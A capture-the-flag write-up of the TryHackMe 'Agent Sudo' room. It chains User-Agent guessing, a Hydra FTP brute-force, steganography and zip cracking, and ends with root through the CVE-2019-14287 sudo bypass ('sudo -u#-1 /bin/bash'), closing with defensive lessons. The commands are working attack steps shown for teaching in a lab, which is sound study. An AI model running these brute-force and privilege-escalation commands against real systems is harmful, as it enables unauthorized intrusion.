# Agent Sudo CTF — Writeup

A walkthrough of the "Agent Sudo" TryHackMe room. The premise: a secret server hidden under the deep sea, tied to a spy-themed story involving a group of "agents" communicating in code. The goal is to enumerate your way to a foothold, pivot between two user accounts via steganography and hash cracking, and finally escalate to root via a sudo CVE.

**Skills covered:** HTTP user-agent fuzzing, FTP brute-forcing, file carving with `binwalk`, zip hash cracking, steganography with `steghide`, and privilege escalation via CVE-2019-14287.

---

## 1. Reconnaissance

Starting with an `nmap` scan:

```bash
nmap -sC -sV -Pn -T4 10.49.145.140
```

Results:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Three services: FTP, SSH, and HTTP. FTP typically needs credentials, SSH too — so HTTP on port 80 is the natural starting point to look for a way in or a clue.

## 2. A Locked Front Door — User-Agent Gating

Visiting the web server (or just `curl`ing it) didn't return the expected page content directly — instead it served an in-character message:

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```

This is a deliberate access-control gimmick: the server is inspecting the `User-Agent` HTTP header and expecting it to match a specific "codename" string rather than a normal browser UA. Sending an arbitrary request confirms this:

```bash
curl -A "R" -L 10.49.145.140
```

```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```

Useful info leak: the response says **"25 employees"**, and it's responding differently depending on the user-agent string sent, which confirms the check is live and gives a hint about the search space (a defined, small group of codenames — likely matching a pattern like single letters or short known names).

### Brute-forcing the user-agent

Since the hint mentions 25 employees (plus Agent R makes 26 — the same count as the alphabet), the natural guess is that codenames are single letters A–Z. Cycling through the alphabet:

```bash
curl -A "C" -L 10.49.145.140
```

```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```

That's a hit. The letter "C" maps to an agent named **chris**, and the message itself leaks two things:

1. A named account to target (`chris`)
2. A warning that `chris`'s password is weak — a strong signal to brute-force it next, and a hint about which attack (dictionary) is likely to succeed

## 3. Brute-Forcing FTP Credentials

With a username (`chris`) and a hint that the password is weak, the FTP service becomes the next logical target:

```bash
hydra -l chris -P /home/rza/stuff/seclists/Passwords/Leaked-Databases/rockyou.txt 10.49.145.140 ftp
```

- `-l chris` — fixed username
- `-P rockyou.txt` — the classic leaked-password wordlist, well-suited for "weak password" hints
- `ftp` — tells Hydra which service module to use

Result:

```
[21][ftp] host: 10.49.145.140   login: chris   password: crystal
```

**Credentials: `chris` / `crystal`**

## 4. FTP Enumeration

Logging in:

```bash
ftp 10.49.145.140
Name: chris
Password: crystal
230 Login successful.

ftp> ls
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

Three files sitting in chris's FTP directory. Downloaded all three for offline analysis.

### Reading the note

```
cat To_agentJ.txt
```

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

This confirms the story's internal logic: there's a second user (likely `james`, matching codename "J"), and one of the two images hides data relevant to getting his login — a direct pointer toward steganography / embedded file analysis on the images.

## 5. Extracting Hidden Data from `cutie.png`

Running `binwalk` against both images to check for embedded file signatures, `cute-alien.jpg` came back clean, but `cutie.png` did not:

```bash
binwalk cutie.png
```

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

There's a **password-protected zip archive appended after the PNG's actual image data** — a classic file-concatenation steganography trick, since most image viewers/parsers stop reading once they hit the PNG's own end-of-file marker and never notice the extra bytes tacked on afterward.

Extracting it:

```bash
binwalk -e cutie.png
cd _cutie.png.extracted
ls
# 365  365.zlib  8702.zip
```

(Note: binwalk threw a warning about a missing `jar` utility for one extraction attempt, but the zip itself extracted fine regardless.)

## 6. Cracking the Embedded Zip

The extracted `8702.zip` is password-protected, so the next step is generating a crackable hash with `zip2john` and running it through John:

```bash
/home/rza/john/run/zip2john 8702.zip > zip.hash
cat zip.hash
# 8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*...*$/zip2$:To_agentR.txt:8702.zip:8702.zip

/home/rza/john/run/john --wordlist=/home/rza/stuff/seclists/Passwords/Leaked-Databases/rockyou.txt zip.hash
```

```
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE
```

**Zip password: `alien`**

> Note: I originally ran this with the system's default `john` binary on `$PATH` (`/usr/sbin/john`), which failed with "No password hashes loaded" despite the hash being correctly formatted — the fix was calling the full path to my Jumbo John build directly (`/home/rza/john/run/john`), since the system's default install didn't support this hash format. Worth setting an alias so this doesn't bite again.

## 7. A Second Layer of Encoding

Extracting and reading the zip's contents:

```
cat To_agentR.txt
```

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

`QXJlYTUx` looks like Base64 (the character set and padding pattern are a giveaway). Decoding it:

```bash
echo 'QXJlYTUx' | base64 -d
# Area51
```

**Decoded: `Area51`** — this turns out to be the passphrase for the next steganography step, not a literal place reference in this context.

## 8. Extracting Hidden Data from `cute-alien.jpg`

Earlier, `binwalk` found nothing embedded in `cute-alien.jpg` — but `binwalk` only looks for recognizable file signatures appended or embedded in a structurally-detectable way. Dedicated steganography tools like `steghide` work differently: they hide data **inside the image's own pixel/DCT data**, which doesn't leave a separate file signature for binwalk to catch. That makes `steghide` the right tool to check next, especially with a candidate passphrase in hand:

```bash
steghide --info cute-alien.jpg
# Enter passphrase: Area51
```

```
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Confirmed — there's a hidden `message.txt` inside, encrypted with the `Area51` passphrase. Extracting it:

```bash
steghide --extract -sf cute-alien.jpg
# Enter passphrase: Area51
# wrote extracted data to "message.txt"

cat message.txt
```

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

**SSH credentials: `james` / `hackerrules!`**

## 9. Initial Shell Access

```bash
ssh james@10.49.145.140
# Password: hackerrules!
```

```
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
james@agent-sudo:~$
```

**Shell obtained as `james`.**

```bash
ls
# Alien_autospy.jpg  user_flag.txt

cat user_flag.txt
# b03d975e8c92a7c04146cfa7a5a313c7
```

**User flag obtained.** ✅ (`Alien_autospy.jpg` is a themed red herring/trivia image tied to the room's story questions, not something needed for the technical path.)

## 10. Privilege Escalation — CVE-2019-14287

Checking sudo permissions as the first step of any privesc attempt:

```bash
sudo -l
```

```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=...

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

This entry looks restrictive at first glance — `(ALL, !root)` is meant to let `james` run `/bin/bash` as _any user except root_. But this exact configuration is the textbook trigger for **CVE-2019-14287**, a sudo vulnerability (affecting versions up to 1.8.27) where specifying a user ID of `-1` (or `4294967295`, its unsigned equivalent) bypasses the `!root` exclusion. Sudo's internal user-lookup logic doesn't correctly handle the negative/overflow UID, and ends up resolving it to UID `0` — root — anyway, despite the explicit denial in the policy.

Exploiting it:

```bash
sudo -u#-1 /bin/bash
```

```
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

**Root obtained** (note the `uid=0` despite `gid`/`groups` still showing `james` — the UID is what matters for privilege checks).

```bash
cat /root/root.txt
```

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

**Root flag obtained.** ✅ (The closing message also answers the room's bonus trivia question — the real identity behind "Agent R" is the room's author, DesKel.)

---

## Summary

|Flag|Value|How obtained|
|---|---|---|
|User flag|`b03d975e8c92a7c04146cfa7a5a313c7`|SSH as `james` after chaining FTP → steganography → steghide extraction|
|Root flag|`b53a02f55b57d4439e3341834d70c062`|CVE-2019-14287 sudo bypass (`sudo -u#-1 /bin/bash`)|

### Attack chain at a glance

1. **Recon** — `nmap` finds FTP, SSH, HTTP
2. **User-agent gating bypass** — brute-force single-letter codenames against the HTTP `User-Agent` header, find `C` → agent "chris"
3. **FTP brute-force** — Hydra + rockyou.txt against `chris`, cracks to `crystal`
4. **FTP loot** — download `To_agentJ.txt`, `cutie.png`, `cute-alien.jpg`
5. **File carving** — `binwalk` finds an encrypted zip appended to `cutie.png`
6. **Zip crack** — `zip2john` + John + rockyou.txt → zip password `alien`
7. **Base64 decode** — zip contents reveal `QXJlYTUx` → decodes to `Area51`
8. **Steganography** — `steghide` on `cute-alien.jpg` using `Area51` as passphrase → reveals `james`'s SSH password `hackerrules!`
9. **Initial shell** — SSH as `james`, grab user flag
10. **Privilege escalation** — `sudo -l` reveals `(ALL, !root) /bin/bash`; exploited via CVE-2019-14287 (`sudo -u#-1 /bin/bash`) → root

### Takeaways / lessons

- **Custom auth logic built on inspectable headers (like User-Agent) is not real access control.** It only raises the bar from "no bar" to "guess the right string," and with a hinted search space (25 employees ≈ alphabet), it's trivially brute-forceable.
- **In-band hints matter.** The "change your password, it's weak" line directly previewed that a dictionary attack would work — reading flavor text carefully in CTFs (and in real pentest social-engineering artifacts) often shortcuts the attack path.
- **`binwalk` and `steghide` catch different things.** `binwalk` finds file signatures appended to or embedded within a file's raw bytes; `steghide` finds data hidden inside the image's own pixel/DCT encoding. A negative result from one doesn't rule out the other — both are worth trying on any image in a stego-flavored challenge.
- **Appending a zip after a PNG's EOF marker is a classic concealment trick** — most viewers ignore trailing bytes after the format's defined end, but the data is still fully intact and extractable.
- **`sudo -l` is always worth checking first** in any privesc attempt — an overly-clever "allow all except root" rule is exactly the kind of misconfiguration CVE-2019-14287 was built to exploit, since sudo's own user/UID parsing had a logic flaw around negative and unsigned-edge-case values.
- **Keep sudo (and other privileged binaries) patched.** This CVE was fixed in 1.8.28 — the box's own final message even says as much ("always update your machine").

---

_Writeup based on my own enumeration and exploitation notes, cross-referenced against a public walkthrough by Sunjid Ahmed Siyem on Medium for methodology confirmation._